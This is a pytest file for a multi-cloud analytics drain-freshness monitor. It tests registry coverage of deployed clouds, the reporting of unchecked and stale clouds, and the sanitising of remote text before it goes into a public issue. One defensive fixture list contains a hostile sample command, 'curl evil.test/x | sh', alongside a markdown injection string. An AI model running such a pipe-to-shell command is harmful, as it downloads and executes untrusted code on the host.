"""The binding: a deployed cloud cannot exist without a drain-freshness signal.

The AWS-EU drain went fifteen days (2026-08-02..17) delivering nothing while
470,370 rows piled up in the outbox, because the only backlog alarm in
existence is emitted by the drain process that was never installed. GCP was
healthy the whole time, so the fleet looked healthy.

Publishing `analytics.drain_lag_seconds` fixes the signal. These tests fix the
COVERAGE: they fail if `operational_analytics_fleet.ANALYTICS_FRESHNESS_FLEET`
disagrees, in either direction, with the union of every table in this repo that
declares a deployment -- so adding a fourth cloud is impossible without either
giving it an endpoint or writing down why it has none, and it does not matter
which of those tables the fourth cloud lands in first.
"""

from __future__ import annotations

import datetime as dt
from pathlib import Path

import pytest
import yaml

import clickhouse.check_fleet_analytics_freshness as fleet_module
from clickhouse.check_fleet_analytics_freshness import evaluate_fleet
from trusted_router import regions as regions_module
from trusted_router.byok_v1_attestations import (
    ENCLAVE_CONTROL_PLANE_SOURCES,
    STANDALONE_CLOUDS,
)
from trusted_router.config import Settings
from trusted_router.operational_analytics_fleet import (
    ANALYTICS_FRESHNESS_FLEET,
    FleetAnalyticsEndpoint,
    checkable_endpoints,
    deployed_clouds,
    deployment_sources,
    fleet_endpoint,
    registry_defects,
)
from trusted_router.operational_analytics_freshness import (
    ANALYTICS_STATUS_KEY,
    BACKEND_FIELD,
    BACKEND_POSTGRES,
    BACKEND_SPANNER,
    REASON_NOT_CONFIGURED,
    REASON_UNREACHABLE,
    analytics_status_section,
    analytics_status_unavailable,
)
from trusted_router.synthetic import fleet as synthetic_fleet

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github/workflows/check-analytics-freshness.yml"

NOW = dt.datetime(2026, 8, 17, 12, 0, tzinfo=dt.UTC)

#: Which clouds the parametrised fleet tests run over, DERIVED from the
#: registry and split by property rather than by name. A hardcoded
#: ["aws", "gcp"] would give a fourth registry entry strictly less coverage
#: than the third one has today -- a hand-maintained cloud list, in the file
#: whose whole thesis is that hand-maintained cloud lists are the defect.
CHECKABLE_CLOUDS = [entry.cloud for entry in checkable_endpoints()]
MEASURED_CLOUDS = [entry.cloud for entry in checkable_endpoints() if entry.expects_outbox]
OUTBOX_FREE_CLOUDS = [entry.cloud for entry in checkable_endpoints() if not entry.expects_outbox]


# ---------------------------------------------------------------------------
# The binding itself.
# ---------------------------------------------------------------------------


def test_registry_covers_every_deployed_cloud_and_nothing_else() -> None:
    """The whole point. Failure here prints what to add and why."""
    assert registry_defects() == []


def test_every_standalone_cloud_has_an_entry() -> None:
    """Stated against STANDALONE_CLOUDS directly, not only through the union.

    `deployed_clouds()` takes a union of four tables, and a union is exactly the
    kind of derivation that can be quietly widened until it proves nothing.
    """
    covered = {entry.cloud for entry in ANALYTICS_FRESHNESS_FLEET}
    missing = sorted(set(STANDALONE_CLOUDS) - covered)

    assert not missing, (
        f"{missing} are standalone deployments with no drain-freshness endpoint. "
        "Add them to ANALYTICS_FRESHNESS_FLEET in "
        "src/trusted_router/operational_analytics_fleet.py."
    )


# ---------------------------------------------------------------------------
# HIGH-1: the requirement is a UNION over every deployment-declaring table,
# not one hand-transcribed tuple.
# ---------------------------------------------------------------------------


def test_deployment_sources_include_every_table_that_declares_a_deployment() -> None:
    """The named sources. A source dropped from here is coverage dropped silently.

    `byok_v1_attestations` says in its own comment that its tables were
    transcribed by hand out of another repository and re-read nothing. Binding
    coverage to that alone means a fourth cloud needs a freshness endpoint only
    once somebody edits a BYOK module while thinking about BYOK.
    """
    names = {source.name for source in deployment_sources()}

    assert names == {
        "trusted_router.byok_v1_attestations.clouds_that_must_attest()"
        " (STANDALONE_CLOUDS + ENCLAVE_CONTROL_PLANE_SOURCES)",
        "trusted_router.regions.MULTICLOUD_REGION_GEO",
        "trusted_router.config.Settings.external_live_regions",
        "trusted_router.config.Settings.marketing_regions",
        "trusted_router.config.Settings.synthetic_fleet_peers",
    }


def test_the_peer_list_is_bound_because_it_is_this_registry_s_closest_relative() -> None:
    """`synthetic_fleet_peers` is cloud-keyed, config-as-code, and holds status URLs.

    It is the table in this repo that most resembles ANALYTICS_FRESHNESS_FLEET:
    one entry per deployment, keyed by cloud name, carrying the public status
    URL that every cloud already polls. A fourth cloud added there is a fourth
    cloud whose /status.json this repo fetches on every synthetic pass -- while
    nothing looked at its drain lag. Leaving it unbound is the outage's shape
    with the halves swapped: the watchers know about a deployment the coverage
    check does not.
    """
    peers = {
        name for name, _url in synthetic_fleet.parse_fleet_peers(Settings.model_fields[
            "synthetic_fleet_peers"
        ].default)
    }
    source = next(
        source
        for source in deployment_sources()
        if source.name == "trusted_router.config.Settings.synthetic_fleet_peers"
    )

    assert set(source.clouds) == peers
    assert peers == {"aws", "azure", "gcp"}


def test_a_fourth_cloud_added_only_to_the_peer_list_fails_the_binding() -> None:
    """The proof, entered through the source this round added.

    Somebody stands up a fourth deployment and wires the fleet page to watch
    it. That single edit must be enough to demand a drain-freshness endpoint.
    """
    settings = Settings(
        environment="local",
        synthetic_fleet_peers=(
            "gcp=https://trustedrouter.com"
            ",aws=https://aws.trustedrouter.com"
            ",azure=https://azure.trustedrouter.com"
            ",oracle=https://oracle.trustedrouter.com"
        ),
    )

    defects = registry_defects(settings=settings)

    assert len(defects) == 1
    assert defects[0].startswith("oracle:")
    assert "trusted_router.config.Settings.synthetic_fleet_peers" in defects[0]


@pytest.mark.parametrize(
    ("candidate", "why_not_bound"),
    [
        ("catalog_data", "a provider we route to is not a deployment"),
        ("bedrock_group_buy", "a spend source ticked on a signup form"),
        ("primary_region", "attested-gateway regions are GCP-only by construction"),
        ("synthetic_status_us_url", "one deployment's status service, keyed by geography"),
    ],
)
def test_the_sweep_for_other_cloud_named_tables_is_written_down(
    candidate: str, why_not_bound: str
) -> None:
    """Every cloud-named table that is NOT bound has to say why, in the module.

    "I did not think of it" and "it does not declare a deployment" look
    identical from outside, and this registry's whole claim is that the second
    one has been checked. `deployment_sources()` therefore names each rejected
    candidate and its reason; this test fails if one is dropped from the
    docstring, which is where the next reader will look for the sweep.
    """
    doc = deployment_sources.__doc__ or ""

    assert candidate in doc, f"{candidate} not accounted for ({why_not_bound})"


# ---------------------------------------------------------------------------
# A bound source that has gone empty proves nothing.
# ---------------------------------------------------------------------------


def test_a_deployment_source_that_degrades_to_zero_clouds_is_a_defect(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The vacuous-union hole: `set() >= set()` is True, and nothing notices.

    Every "is this cloud covered?" question is asked against a UNION, so a
    source that stops contributing does not fail anything -- it just quietly
    stops being part of the requirement. That is the same class of defect as
    the outage: a signal that reports success because it measured nothing.
    """
    monkeypatch.setattr(regions_module, "MULTICLOUD_REGION_GEO", {})

    defects = registry_defects(["aws", "azure", "gcp"])

    assert any(
        defect.startswith("trusted_router.regions.MULTICLOUD_REGION_GEO: declares NO clouds")
        for defect in defects
    )


def test_a_settings_source_that_stops_being_a_string_raises_instead_of_reading_empty() -> None:
    """`""` is the value that cannot fail: it parses to no clouds, silently.

    A field retyped to a list -- a plausible refactor of a comma-separated
    setting -- used to return "" here and delete a whole deployment source
    without a word.
    """

    class _RetypedSettings:
        external_live_regions = "aws-eu-west-1"
        marketing_regions = ["us-central1"]  # was a comma-separated string
        synthetic_fleet_peers = "gcp=https://trustedrouter.com"

    with pytest.raises(TypeError) as excinfo:
        deployment_sources(_RetypedSettings())  # type: ignore[arg-type]

    assert "marketing_regions" in str(excinfo.value)
    assert "not str" in str(excinfo.value)


def test_deployed_clouds_is_the_union_of_every_source() -> None:
    for source in deployment_sources():
        assert set(deployed_clouds()) >= set(source.clouds), source.name


def test_deployed_clouds_covers_both_byok_tables_and_the_region_tables() -> None:
    covered = set(deployed_clouds())

    assert covered >= set(STANDALONE_CLOUDS)
    assert covered >= set(ENCLAVE_CONTROL_PLANE_SOURCES)
    assert covered >= {geo.cloud for geo in regions_module.MULTICLOUD_REGION_GEO.values()}


def test_sources_are_read_at_call_time_not_captured_at_import(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A snapshot taken at import is a binding that stops binding after a reload.

    Each of the four proofs below edits one real table and expects the failure;
    they can only work if the module re-reads.
    """
    monkeypatch.setattr(
        regions_module,
        "MULTICLOUD_REGION_GEO",
        {
            **regions_module.MULTICLOUD_REGION_GEO,
            "oracle-eu-frankfurt-1": regions_module.RegionGeo(
                "oracle-eu-frankfurt-1", "Frankfurt", 50.111, 8.682, cloud="oracle"
            ),
        },
    )

    assert "oracle" in deployed_clouds()


@pytest.mark.parametrize(
    "source_name",
    [
        "trusted_router.byok_v1_attestations.clouds_that_must_attest()"
        " (STANDALONE_CLOUDS + ENCLAVE_CONTROL_PLANE_SOURCES)",
        "trusted_router.regions.MULTICLOUD_REGION_GEO",
        "trusted_router.config.Settings.external_live_regions",
        "trusted_router.config.Settings.marketing_regions",
    ],
)
def test_every_bound_source_is_named_in_the_failure_message(source_name: str) -> None:
    """The message has to say what the requirement is MADE of.

    An operator reading "oracle is deployed but missing" needs to know which
    table said so -- the fix is in a different file for each one -- and needs to
    see the full list, because the next reader's question is "what else counts
    as declaring a deployment?".
    """
    defects = registry_defects([*STANDALONE_CLOUDS, "oracle"])

    assert len(defects) == 1
    assert source_name in defects[0]


def test_a_fourth_cloud_without_an_entry_fails_with_instructions() -> None:
    """The proof that the guard bites. This is the scenario the PR is about.

    A cloud is deployed (it reaches the deployment list) and nobody added a
    freshness endpoint for it, which is precisely how AWS-EU ended up with an
    outbox nothing was watching.
    """
    defects = registry_defects([*STANDALONE_CLOUDS, "oracle"])

    assert len(defects) == 1
    message = defects[0]
    assert message.startswith("oracle:")
    # It must say WHERE to add it, WHAT to add, and WHY.
    assert "src/trusted_router/operational_analytics_fleet.py" in message
    assert "FleetAnalyticsEndpoint" in message
    assert "reason=" in message
    assert "expects_outbox=False" in message
    assert "470,370" in message


def test_a_fake_cloud_in_the_region_table_fails_the_binding(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Same proof, entered through a different table.

    This is the one `STANDALONE_CLOUDS` alone could not catch: a deployment
    added to the map without anybody touching a BYOK module.
    """
    monkeypatch.setattr(
        regions_module,
        "MULTICLOUD_REGION_GEO",
        {
            **regions_module.MULTICLOUD_REGION_GEO,
            "oracle-eu-frankfurt-1": regions_module.RegionGeo(
                "oracle-eu-frankfurt-1", "Frankfurt", 50.111, 8.682, cloud="oracle"
            ),
        },
    )

    defects = registry_defects()

    assert len(defects) == 1
    assert defects[0].startswith("oracle:")
    assert "trusted_router.regions.MULTICLOUD_REGION_GEO" in defects[0]


def test_a_region_on_a_known_cloud_needs_no_table_edit_to_be_attributed() -> None:
    """`aws-eu-west-2` is AWS because `aws-` is already a cloud namespace.

    The namespace is what MULTICLOUD_REGION_GEO's rows establish, so a new
    region on an existing cloud resolves without anybody editing a table --
    while a prefix nobody has established cannot mint a cloud at all.
    """
    assert regions_module.cloud_for_region("aws-eu-west-2") == "aws"
    assert regions_module.cloud_for_region("azure-westeurope") == "azure"
    assert regions_module.cloud_region_namespaces() == {"aws", "azure"}


def test_a_fourth_cloud_in_external_live_regions_fails_once_its_namespace_exists(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A settings default is a deployment claim too: it lights the map dot up.

    Entered the way a real fourth cloud arrives -- a map row first, then the
    live list -- so the second region id resolves through the namespace the
    first one established.
    """
    monkeypatch.setattr(
        regions_module,
        "MULTICLOUD_REGION_GEO",
        {
            **regions_module.MULTICLOUD_REGION_GEO,
            "oracle-eu-frankfurt-1": regions_module.RegionGeo(
                "oracle-eu-frankfurt-1", "Frankfurt", 50.111, 8.682, cloud="oracle"
            ),
        },
    )
    settings = Settings(
        environment="local",
        external_live_regions="aws-eu-west-1,azure-australiaeast,oracle-eu-frankfurt-2",
    )

    defects = registry_defects(settings=settings)

    assert len(defects) == 1
    assert defects[0].startswith("oracle:")
    assert "trusted_router.config.Settings.external_live_regions" in defects[0]


def test_a_region_id_no_table_can_attribute_is_reported_instead_of_guessed() -> None:
    """A region id belonging to nobody must fail as itself, not as a cloud.

    WHAT THIS CATCHES, and what its predecessor did not. The predecessor
    asserted that "a cloud id with no namespace does not invent a cloud" using
    `us-central1` and `europe-west4` -- both GCP_REGION_GEO keys, so the
    resolver returned two branches early and the prefix fallback under test was
    never reached. It was green about a property it never exercised, which is
    worse than absent: it read like coverage.

    The ids here are REAL GCP regions deliberately absent from that
    hand-maintained table (Google keeps shipping regions; the table is updated
    by hand). Under the old prefix fallback they resolved to clouds named
    "europe", "us" and "me", and the coverage check then failed CI demanding a
    /status.json for a cloud that does not exist. They must now be reported as
    unattributed ids naming the setting that declares them -- which is also
    what a genuinely new cloud entered only through settings looks like, and
    both want the same fix: write down which cloud it is.
    """
    for region in ("europe-west12", "us-south1", "me-central2"):
        assert regions_module.cloud_for_region(region) is None, region

    settings = Settings(environment="local", marketing_regions="us-central1,europe-west12")
    defects = registry_defects(settings=settings)

    assert len(defects) == 1
    assert defects[0].startswith("trusted_router.config.Settings.marketing_regions:")
    assert "'europe-west12'" in defects[0]
    assert "MULTICLOUD_REGION_GEO" in defects[0] and "GCP_REGION_GEO" in defects[0]
    # And emphatically not a cloud named after a geography.
    assert not any(defect.startswith("europe:") for defect in defects)


def test_a_bare_gcp_region_still_resolves_to_gcp() -> None:
    """The table's own keys, which must not read as clouds "us" or "europe"."""
    assert regions_module.cloud_for_region("us-central1") == "gcp"
    assert regions_module.cloud_for_region("europe-west4") == "gcp"

    settings = Settings(environment="local", external_live_regions="us-central1,europe-west4")

    assert registry_defects(settings=settings) == []


def test_an_entry_for_a_retired_cloud_fails_too() -> None:
    """The other direction: a URL that outlived its deployment fails forever."""
    defects = registry_defects(["aws", "azure"])

    assert len(defects) == 1
    assert defects[0].startswith("gcp:")
    assert "not a deployed cloud" in defects[0]


def test_an_entry_with_neither_url_nor_reason_is_rejected() -> None:
    """Silence is what let AWS-EU go unmeasured; the registry may not be silent."""
    defects = registry_defects(
        ["aws"],
        registry=[FleetAnalyticsEndpoint(cloud="aws")],
    )

    assert any("no status_url and no reason" in defect for defect in defects)


def test_an_entry_with_both_url_and_reason_is_rejected() -> None:
    defects = registry_defects(
        ["aws"],
        registry=[
            FleetAnalyticsEndpoint(
                cloud="aws",
                status_url="https://example.test/status.json",
                reason="internal only",
                expected_backend=BACKEND_POSTGRES,
            )
        ],
    )

    assert any("both a status_url and a reason" in defect for defect in defects)


# ---------------------------------------------------------------------------
# HIGH-2: two entries must not be able to point at one control plane.
# ---------------------------------------------------------------------------


def test_two_clouds_sharing_one_status_url_is_a_defect() -> None:
    """Believing you checked a cloud you never checked IS the outage.

    Offline, because at runtime the aws/azure case is undetectable: both run
    Postgres, so whichever plane answers publishes the backend BOTH entries
    expect, and the run reports two clouds checked after reading one.
    """
    url = "https://gchircrcif.eu-west-3.awsapprunner.com/status.json"
    defects = registry_defects(
        ["aws", "azure"],
        registry=[
            FleetAnalyticsEndpoint(
                cloud="aws", status_url=url, expected_backend=BACKEND_POSTGRES
            ),
            FleetAnalyticsEndpoint(
                cloud="azure", status_url=url, expected_backend=BACKEND_POSTGRES
            ),
        ],
    )

    assert len(defects) == 1
    assert defects[0].startswith("azure:")
    assert "shares status_url" in defects[0]
    assert "aws" in defects[0]


def test_every_checkable_entry_declares_the_backend_that_must_answer() -> None:
    for entry in checkable_endpoints():
        assert entry.expected_backend in {BACKEND_POSTGRES, BACKEND_SPANNER}, entry.cloud


def test_a_checkable_entry_without_an_expected_backend_is_rejected() -> None:
    defects = registry_defects(
        ["aws"],
        registry=[
            FleetAnalyticsEndpoint(cloud="aws", status_url="https://a.test/status.json")
        ],
    )

    assert any("no expected_backend" in defect for defect in defects)


def test_a_plane_answering_for_the_wrong_cloud_fails_that_cloud() -> None:
    """The runtime half. GCP's plane cannot answer Azure's question.

    A registry URL retyped one character wrong, or a DNS name repointed, gives
    a 200 and a plausible section -- from the wrong deployment. Matching the
    published backend against the cloud's own is what makes that visible.
    """
    payloads = _as_declared()
    payloads["gcp"] = _healthy("gcp", **{BACKEND_FIELD: BACKEND_POSTGRES})

    result = evaluate_fleet(payloads, now=NOW)

    assert len(result.problems) == 1
    assert result.problems[0].startswith("gcp:")
    assert "another cloud's control plane" in result.problems[0]


# ---------------------------------------------------------------------------
# HIGH-3/4: unchecked is a third outcome, printed, and never a daily failure.
# ---------------------------------------------------------------------------


def test_a_cloud_with_a_reason_is_reported_as_unchecked_and_does_not_fail() -> None:
    """An honest "cannot be checked" must not read as "checked and healthy".

    Nor as a failure: a job that fails every morning about a deployment with no
    public status page is a job people learn to close unread, and then it is
    not watching the clouds it CAN check either.
    """
    registry = (
        FleetAnalyticsEndpoint(cloud="aws", reason="control plane is not public"),
        FleetAnalyticsEndpoint(
            cloud="gcp",
            status_url="https://trustedrouter.com/status.json",
            expected_backend=BACKEND_SPANNER,
        ),
    )

    assert registry_defects(["aws", "gcp"], registry=registry) == []

    result = evaluate_fleet(
        {"gcp": _healthy("gcp")}, now=NOW, registry=registry, deployed=["aws", "gcp"]
    )

    assert result.problems == []
    assert len(result.unchecked) == 1
    assert result.unchecked[0].startswith("aws: NOT CHECKED")


def test_a_cloud_declared_outbox_free_is_unchecked_rather_than_failing() -> None:
    """Azure today: no TR_OPERATIONAL_ANALYTICS_OUTBOX_ENABLED, so no outbox.

    It would publish `not_configured` forever. Failing on it daily is the
    cry-wolf shape the repo already fixed once, in the client-telemetry
    freshness check's `CANARY_COUNT_GATE_FROM` ramp-up guard.
    """
    result = evaluate_fleet(_as_declared(), now=NOW)

    assert result.problems == []
    for cloud in OUTBOX_FREE_CLOUDS:
        assert any(note.startswith(f"{cloud}: NOT CHECKED") for note in result.unchecked)
    assert any("expects_outbox=False" in note for note in result.unchecked)


def test_the_azure_entry_is_the_one_declared_outbox_free() -> None:
    """Read off the deploy script, and pinned so a silent flip is visible.

    `scripts/deploy/azure_control_plane.sh` sets no
    TR_OPERATIONAL_ANALYTICS_OUTBOX_ENABLED at all, and the setting defaults to
    False, so PostgresStore builds no outbox there.
    """
    azure = fleet_endpoint("azure")
    assert azure is not None and azure.expects_outbox is False

    for cloud in ("aws", "gcp"):
        entry = fleet_endpoint(cloud)
        assert entry is not None and entry.expects_outbox is True


def test_a_cloud_declared_outbox_free_that_grows_one_FAILS() -> None:
    """The trapdoor this closes, and the reason it is not just `reason=`.

    Retiring Azure behind a bare reason would also retire the ability to notice
    the day it gets a pipeline -- which would then be unwatched for exactly the
    reason AWS-EU's was.
    """
    payloads = _all_healthy()

    result = evaluate_fleet(payloads, now=NOW)

    assert [problem for problem in result.problems if problem.startswith("azure:")]
    assert any("expects_outbox=True" in problem for problem in result.problems)


@pytest.mark.parametrize("cloud", OUTBOX_FREE_CLOUDS)
def test_a_cloud_declared_outbox_free_still_fails_when_its_database_is_broken(cloud: str) -> None:
    """`expects_outbox=False` excuses `not_configured`, and nothing else."""
    payloads = _as_declared()
    payloads[cloud] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_UNREACHABLE)}

    result = evaluate_fleet(payloads, now=NOW)

    assert [problem for problem in result.problems if problem.startswith(f"{cloud}:")]


def test_unavailable_explanations_differ_per_reason() -> None:
    """One sentence for every reason told the operator the opposite of the truth.

    `not_configured` is not "could not read the outbox": there is no outbox, the
    database is fine, and an operator sent to check it wastes the incident.
    """
    payloads = _as_declared()
    payloads["aws"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
    not_configured = evaluate_fleet(payloads, now=NOW).problems

    payloads["aws"] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_UNREACHABLE)}
    unreachable = evaluate_fleet(payloads, now=NOW).problems

    assert any("pipeline is ABSENT, not behind" in problem for problem in not_configured)
    assert any("could not read the outbox" in problem for problem in unreachable)
    assert not_configured != unreachable


def test_registry_urls_are_https_status_json() -> None:
    for entry in ANALYTICS_FRESHNESS_FLEET:
        if entry.status_url is None:
            assert entry.reason, f"{entry.cloud} has neither a URL nor a reason"
            continue
        assert entry.status_url.startswith("https://")
        assert entry.status_url.endswith("/status.json")


def test_registry_points_at_control_planes_not_the_inference_plane() -> None:
    """api-aws/api-azure.trustedrouter.com are the ENCLAVES; they serve no status."""
    for entry in checkable_endpoints():
        assert entry.status_url is not None
        assert "api-aws." not in entry.status_url
        assert "api-azure" not in entry.status_url


def test_aws_entry_is_the_deployment_that_holds_the_dsql_connection() -> None:
    """Not aws.trustedrouter.com: that vanity name fronts the other AWS plane."""
    entry = fleet_endpoint("aws")

    assert entry is not None
    assert entry.status_url == "https://gchircrcif.eu-west-3.awsapprunner.com/status.json"


# ---------------------------------------------------------------------------
# The fleet check reads every entry, and a silent cloud is a failure.
# ---------------------------------------------------------------------------


def _healthy(cloud: str = "aws", **overrides: object) -> dict[str, object]:
    entry = fleet_endpoint(cloud)
    backend = (entry.expected_backend if entry else None) or BACKEND_POSTGRES
    section: dict[str, object] = dict(
        analytics_status_section(
            oldest_enqueued_at=NOW - dt.timedelta(seconds=30),
            now=NOW,
            outbox_depth=12,
            backend=backend,
        )
    )
    section.update(overrides)
    return {ANALYTICS_STATUS_KEY: section}


def _all_healthy() -> dict[str, dict[str, object] | None]:
    return {entry.cloud: _healthy(entry.cloud) for entry in checkable_endpoints()}


def _as_declared() -> dict[str, dict[str, object] | None]:
    """Every cloud answering what the registry says it should: the clean fleet.

    Derived from the registry rather than written out, so a fourth entry is
    covered by every test built on this the day it lands. `_all_healthy` is
    kept separate on purpose -- it makes the outbox-free clouds publish a live
    lag, which is a FAILURE and has its own test.
    """
    return {
        entry.cloud: (
            _healthy(entry.cloud)
            if entry.expects_outbox
            else {ANALYTICS_STATUS_KEY: analytics_status_unavailable(REASON_NOT_CONFIGURED)}
        )
        for entry in checkable_endpoints()
    }


def test_whole_fleet_healthy_reports_only_the_declared_absence() -> None:
    """Azure is unchecked by declaration; the other two must be clean."""
    result = evaluate_fleet(_as_declared(), now=NOW)

    assert result.problems == []
    assert result.ok


@pytest.mark.parametrize("cloud", MEASURED_CLOUDS)
def test_any_single_cloud_going_stale_fails_the_fleet(cloud: str) -> None:
    """One broken cloud out of three must fail. Two healthy peers are not a quorum."""
    payloads = _as_declared()
    payloads[cloud] = _healthy(cloud, drain_lag_seconds=7_200.0)

    result = evaluate_fleet(payloads, now=NOW)

    assert [problem for problem in result.problems if problem.startswith(f"{cloud}:")]
    assert len(result.problems) == 1


@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
def test_a_cloud_that_publishes_no_analytics_section_fails(cloud: str) -> None:
    """Including the outbox-free one: no section means code too old to publish."""
    payloads = _as_declared()
    payloads[cloud] = {}

    result = evaluate_fleet(payloads, now=NOW)

    assert any(problem.startswith(f"{cloud}:") for problem in result.problems)
    assert any("does not publish drain lag" in problem for problem in result.problems)


@pytest.mark.parametrize("cloud", MEASURED_CLOUDS)
def test_a_cloud_reporting_unavailable_fails(cloud: str) -> None:
    payloads = _as_declared()
    payloads[cloud] = {ANALYTICS_STATUS_KEY: analytics_status_unavailable()}

    result = evaluate_fleet(payloads, now=NOW)

    assert any(problem.startswith(f"{cloud}:") for problem in result.problems)


@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
def test_a_cloud_that_could_not_be_fetched_fails(cloud: str) -> None:
    """Unreachable is a failure, not a skip: this job cannot tell down from lazy."""
    payloads = _as_declared()
    payloads[cloud] = None

    result = evaluate_fleet(payloads, now=NOW)

    assert any("could not read" in problem for problem in result.problems)


@pytest.mark.parametrize("cloud", CHECKABLE_CLOUDS)
def test_a_cloud_nobody_fetched_is_reported_rather_than_skipped(cloud: str) -> None:
    """The fleet-scale version of the original bug: absence rendering as health."""
    payloads = _as_declared()
    payloads.pop(cloud)

    result = evaluate_fleet(payloads, now=NOW)

    assert any(problem.startswith(f"{cloud}: never fetched") for problem in result.problems)


def test_registry_defects_validate_the_registry_that_was_passed_in() -> None:
    """Not the module-level one.

    An earlier revision validated `ANALYTICS_FRESHNESS_FLEET` no matter what it
    was handed, so a caller running against an edited or synthetic registry had
    it silently unexamined -- while the failure message spoke confidently about
    a table that was not in play.
    """
    broken = (
        FleetAnalyticsEndpoint(
            cloud="aws",
            status_url="http://insecure.test/status.json",
            expected_backend=BACKEND_POSTGRES,
        ),
    )

    result = evaluate_fleet({"aws": _healthy()}, now=NOW, registry=broken, deployed=["aws"])

    assert any("must be https://" in problem for problem in result.problems)


def test_a_cloud_slice_does_not_narrow_what_gets_validated() -> None:
    """`--cloud aws` is a debugging aid, not a way to delete the coverage check."""
    result = evaluate_fleet({"aws": _healthy()}, now=NOW, selected=["aws"])

    assert result.problems == []
    assert {"azure", "gcp"} <= {note.split(":")[0] for note in result.unchecked}


def test_registry_defects_surface_inside_the_fleet_run() -> None:
    """CI is the gate, but a broken registry must also fail the live job.

    Otherwise the only thing standing between a fourth cloud and no coverage is
    a test somebody could mark xfail, and the scheduled job would go on
    reporting OK about the three clouds it still knew about.
    """
    aws = fleet_endpoint("aws")
    assert aws is not None

    result = evaluate_fleet({"aws": _healthy()}, now=NOW, registry=(aws,))

    registry_problems = [
        problem for problem in result.problems if problem.startswith("registry:")
    ]
    assert {"azure", "gcp"} <= {problem.split()[1].rstrip(":") for problem in registry_problems}


# ---------------------------------------------------------------------------
# A run that measured nothing is not a pass.
# ---------------------------------------------------------------------------


def test_a_fleet_where_nothing_was_measured_fails_instead_of_exiting_zero() -> None:
    """Every not-a-failure outcome, stacked, used to add up to success.

    Unchecked by declaration, excluded by --cloud, no registry entry at all --
    none of those is a failure on its own, and each is right not to be. Put
    them together and the job exits 0 having asked no cloud anything, which is
    "configured, healthy, and empty": the exact shape of the outage, one level
    up. The floor is what makes the union of excuses inadmissible.
    """
    registry = (
        FleetAnalyticsEndpoint(cloud="aws", reason="control plane is not public"),
        FleetAnalyticsEndpoint(cloud="gcp", reason="control plane is not public"),
    )

    result = evaluate_fleet({}, now=NOW, registry=registry, deployed=["aws", "gcp"])

    assert len(result.unchecked) == 2
    assert any(problem.startswith("nothing was measured: 0 of 2") for problem in result.problems)
    assert not result.ok


def test_the_floor_counts_evaluations_and_not_fetches() -> None:
    """A cloud that was fetched and came back broken HAS been measured.

    Otherwise the floor would fire alongside every real failure and add noise
    to exactly the run an operator is reading most carefully.
    """
    payloads = _as_declared()
    payloads[MEASURED_CLOUDS[0]] = _healthy(MEASURED_CLOUDS[0], drain_lag_seconds=7_200.0)

    result = evaluate_fleet(payloads, now=NOW)

    assert not any(problem.startswith("nothing was measured") for problem in result.problems)


# ---------------------------------------------------------------------------
# Privacy, second surface: the problems list is pasted into a PUBLIC issue.
# ---------------------------------------------------------------------------

#: Strings a compromised, buggy, or repointed plane could publish. Each is
#: shaped like something that would matter if it appeared in a public issue in
#: this repository.
HOSTILE_REMOTE_TEXT = [
    'connection to "tr-eu.dsql.eu-west-3.on.aws" (10.0.3.17), port 5432 failed',
    'FATAL: role "quill-enclave-role" is not permitted to log in',
    "@everyone see https://evil.test/urgent -- run `curl evil.test/x | sh`",
    "```\n</details>\n# INJECTED HEADING\n",
]


@pytest.mark.parametrize("hostile", HOSTILE_REMOTE_TEXT)
def test_arbitrary_remote_reason_text_never_reaches_the_problems_list(hostile: str) -> None:
    """The clamp is airtight at the PUBLISHER. This is the other end of the wire.

    `evaluate` formats what it read off a remote page into a problem line;
    `main` writes those lines to --problems-file; the workflow pastes that file
    verbatim into a public GitHub issue body. So a plane that publishes
    whatever it likes -- older code, a misconfiguration, a repointed status
    hostname, an attacker -- chooses text in an issue in this repository unless
    the value is narrowed HERE too, on the way in, exactly as the publisher
    narrows it on the way out.
    """
    payloads = _as_declared()
    payloads["aws"] = {
        ANALYTICS_STATUS_KEY: {"available": False, "reason": hostile},
    }

    result = evaluate_fleet(payloads, now=NOW)
    rendered = "\n".join([*result.problems, *result.unchecked])

    assert [problem for problem in result.problems if problem.startswith("aws:")]
    assert hostile not in rendered
    for fragment in ("dsql", "10.0.3.17", "evil.test", "INJECTED", "quill-enclave-role"):
        assert fragment not in rendered
    assert "NOT reproduced here" in rendered


def test_an_arbitrary_remote_backend_name_never_reaches_the_problems_list() -> None:
    """Same wire, same surface, the other narrowed field."""
    payloads = _as_declared()
    payloads["aws"] = _healthy("aws", **{BACKEND_FIELD: "dsql://tr-eu.eu-west-3.on.aws"})

    result = evaluate_fleet(payloads, now=NOW)
    rendered = "\n".join(result.problems)

    assert "tr-eu.eu-west-3.on.aws" not in rendered
    assert "'unknown'" in rendered


def test_an_unhashable_remote_reason_does_not_crash_the_run() -> None:
    """`x in frozenset` raises TypeError on a list, outside anybody's try block.

    A checker that dies on the payload it was supposed to report is a checker
    that goes quiet exactly when something is wrong with a plane.
    """
    payloads = _as_declared()
    payloads["aws"] = {ANALYTICS_STATUS_KEY: {"available": False, "reason": ["unreachable"]}}

    result = evaluate_fleet(payloads, now=NOW)

    assert [problem for problem in result.problems if problem.startswith("aws:")]


def test_hostile_remote_text_cannot_reach_the_issue_body_file(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """End to end through `main`, because the issue body IS this file.

    The workflow does `cat /tmp/problems.txt` into the issue body, so this is
    the last boundary before publication and the only one that proves the
    clamp survives the whole path rather than just `evaluate`.
    """
    hostile = HOSTILE_REMOTE_TEXT[0]

    def fake_fetch(url: str) -> dict[str, object]:
        return {ANALYTICS_STATUS_KEY: {"available": False, "reason": hostile}}

    monkeypatch.setattr(fleet_module, "fetch_status", fake_fetch)
    problems_file = tmp_path / "problems.txt"

    exit_code = fleet_module.main(["--problems-file", str(problems_file)])
    body = problems_file.read_text()

    assert exit_code == 1
    assert hostile not in body
    assert "10.0.3.17" not in body and "dsql" not in body
    assert "aws:" in body


# ---------------------------------------------------------------------------
# The workflow. Parsed, not grepped.
# ---------------------------------------------------------------------------


